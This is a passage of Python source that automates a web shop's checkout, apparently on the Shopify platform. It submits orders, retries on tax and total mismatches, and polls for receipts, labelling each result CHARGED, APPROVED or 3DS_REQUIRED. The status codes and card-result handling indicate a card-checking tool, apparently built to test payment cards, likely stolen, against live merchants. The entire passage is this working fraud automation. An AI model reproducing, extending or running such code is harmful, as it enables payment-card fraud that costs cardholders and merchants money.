                    payment_flexibility_terms_id=flex_terms_id)

                if "TAX_NEW_TAX_MUST_BE_ACCEPTED" in submit_body:
                    new_tax   = extract_tax_from_rejected(submit_body)
                    new_total = extract_total_from_rejected(submit_body)
                    if new_tax:
                        current_tax = new_tax
                    if new_total:
                        current_total = new_total
                    await asyncio.sleep(0.05)
                    continue

                if ("WAITING_PENDING_TERMS" in submit_body
                        or "Waiting for pending terms" in submit_body):
                    corr_total, corr_tax = extract_rejected_totals(submit_body)
                    if corr_total and float(corr_total) > 0:
                        current_total = corr_total
                    if corr_tax:
                        current_tax = corr_tax
                    dh, dh_ship = extract_delivery_from_proposal(submit_body)
                    if dh:
                        delivery_handle = dh
                        if dh_ship:
                            shipping_amount = dh_ship
                    signed2 = extract_signed_handles(submit_body)
                    if signed2:
                        signed_handles = signed2
                    await asyncio.sleep(extract_pending_poll_delay(submit_body))
                    continue

                if "cannot cover the total amount" in submit_body and not cover_any:
                    corrected_total, corrected_tax = extract_rejected_totals(submit_body)
                    if corrected_total and float(corrected_total) > 0:
                        current_total = corrected_total
                        if corrected_tax:
                            current_tax = corrected_tax
                    else:
                        cover_any = True
                    await asyncio.sleep(0.05)
                    continue
                break

            _ = submit_status
            check_submit_errors(submit_status, submit_body)
            await tracker.checkout_submitted()

            receipt_id = extract_receipt_id(submit_body)
            if not receipt_id:
                raw = extract_any_error(submit_body)
                if raw:
                    error_msg = normalize_card_result(raw)
                    result.status      = result_status_for(error_msg)
                    result.status_code = error_msg
                    result.error       = Exception(error_msg)
                    result.retryable   = (error_msg in ("GENERIC_ERROR", "CHECKOUT_RETRYABLE")
                                          or any(k in error_msg.lower()
                                                 for k in ['inventory', 'retry', 'try again']))
                else:
                    error_msg, retry = no_code_failure(submit_body)
                    result.status    = CheckStatus.APPROVED if retry else CheckStatus.ERROR
                    result.status_code = error_msg
                    result.error     = Exception(error_msg)
                    result.retryable = retry
                return result

            receipt_session_token = extract_receipt_session_token(submit_body)
            if not receipt_session_token:
                raise Exception("Step 10 failed: could not extract sessionToken")
            if not result.gateway:
                result.gateway = extract_gateway_name(proposal5_body, submit_body)
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error  = e
            return result

        # Step 11 — poll for receipt
        poll_delay_re = re.compile(r'"pollDelay"\s*:\s*(\d+)')
        type_name_re  = re.compile(r'"__typename"\s*:\s*"([A-Za-z_]*Receipt[A-Za-z_]*)"')
        seen_rounds = 0
        max_patient_rounds = 120
        patient_rounds = 0
        last_outcome = "unknown"

        while seen_rounds < 30:
            try:
                _, poll_body = await send_poll_for_receipt(
                    client, shop_url, checkout_url, checkout_token, session_token,
                    build_id, source_token, poll_for_receipt_id,
                    receipt_id, receipt_session_token)

                receipt_type = ""
                m = type_name_re.search(poll_body)
                if m:
                    receipt_type = m.group(1)

                outcome = classify_receipt(poll_body, receipt_type)
                last_outcome = outcome
                result.status_code = extract_receipt_status_code(poll_body, receipt_type)

                if outcome == "success":
                    result.status      = CheckStatus.CHARGED
                    result.status_code = "ORDER_PAID"
                    result.receipt_url = checkout_url + "/thank_you"
                    return result

                if outcome == "action":
                    result.status      = CheckStatus.APPROVED
                    result.status_code = "3DS_REQUIRED"
                    return result

                if outcome == "failure":
                    em         = re.search(r'"code"\s*:\s*"([^"]+)"', poll_body)
                    error_code = normalize_card_result(em.group(1)) if em else ""
                    if error_code == "FAILED":
                        error_code = "GENERIC_ERROR"
                    if not error_code:
                        error_code = "UNKNOWN_ERROR"
                        raw_msg = extract_any_error(poll_body)
                        if raw_msg:
                            error_code = f"UNKNOWN_ERROR: {raw_msg[:80]}"
                    result.status      = result_status_for(error_code)
                    result.status_code = error_code
                    result.error       = Exception(error_code)
                    result.retryable   = (error_code in ("GENERIC_ERROR", "CHECKOUT_RETRYABLE")
                                          or error_code == "01003"
                                          or "InventoryReservationFailure" in poll_body)
                    return result

                if outcome in ("pending", "retryable"):
                    patient_rounds += 1
                else:
                    seen_rounds += 1

                if patient_rounds > max_patient_rounds:
                    break

                delay = 500
                m2 = poll_delay_re.search(poll_body)
                if m2:
                    try:
                        d = int(m2.group(1))
                        if d > 0:
                            delay = d
                    except ValueError:
                        pass
                if outcome == "retryable":
                    delay = max(delay, 400)
                await asyncio.sleep(min(delay, 150) / 1000.0)

            except Exception as e:
                result.status = CheckStatus.ERROR
                result.error  = Exception(f"poll {seen_rounds + 1} failed: {e}")
                return result

        if last_outcome in ("pending", "retryable", "unknown"):
            result.status      = CheckStatus.APPROVED
            result.status_code = "ORDER_SUBMITTED"
            result.retryable   = True
            result.error       = Exception("ORDER_SUBMITTED (receipt not confirmed)")
            return result

        result.status = CheckStatus.ERROR
        result.error  = Exception("exceeded 30 poll attempts")
        return result

    finally:
        try:
            logger.set_result(result.status, result.status_code, result.amount,
                              result.currency, result.gateway, result.error)
            logger.save()
        except Exception:
            pass
        await client.close()
